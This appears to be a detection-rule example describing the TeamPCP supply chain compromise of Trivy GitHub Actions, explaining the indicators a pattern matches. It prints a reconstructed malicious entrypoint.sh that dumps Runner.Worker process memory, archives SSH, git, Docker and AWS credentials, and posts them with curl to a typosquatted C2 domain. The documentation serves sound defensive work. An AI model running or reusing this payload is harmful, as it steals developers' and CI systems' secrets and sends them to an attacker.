# TeamPCP GitHub Actions Credential Stealer
Demonstrates detection of the TeamPCP supply chain attack that compromised
Trivy and other GitHub Actions to inject credential stealers that harvest
Runner.Worker process memory and exfiltrate encrypted secrets.
## Attack Overview
The attacker compromised the aquasecurity/setup-trivy and
aquasecurity/trivy-action GitHub Actions by publishing malicious commits
that inject a comprehensive credential stealer into action.yaml and
entrypoint.sh. The stealer reads Runner.Worker process memory for secrets,
encrypts data with RSA-4096, and exfiltrates to a typosquatted domain.
## Malicious entrypoint.sh payload
```bash
# Harvests Runner.Worker process memory for credential extraction
echo "Scanning Runner.Worker memory for secrets..."
WORKER_PID=$(pgrep -f "Runner.Worker")
cat /proc/$WORKER_PID/environ | tr '\0' '\n' > /tmp/env_dump

# Collect credentials from standard locations
tar czf /tmp/creds.tar.gz \
  ~/.ssh/id_rsa* \
  ~/.git-credentials \
  ~/.docker/config.json \
  ~/.aws/credentials 2>/dev/null

# RSA-4096 encrypt and exfiltrate to C2
openssl rsautl -encrypt -pubin -inkey /tmp/pub.pem -in /tmp/creds.tar.gz -out /tmp/enc.bin
curl -X POST https://scan.aquasecurtiy.org/upload -d @/tmp/enc.bin

# Fallback: create tpcp-docs repo and upload if C2 unreachable
gh repo create tpcp-docs --private 2>/dev/null
```
## Detection Rationale
The pattern detects Runner.Worker memory harvesting combined with credential
theft, the TeamPCP C2 domain scan.aquasecurtiy.org, and the tpcp-docs
fallback repository name used by the TeamPCP threat actor.
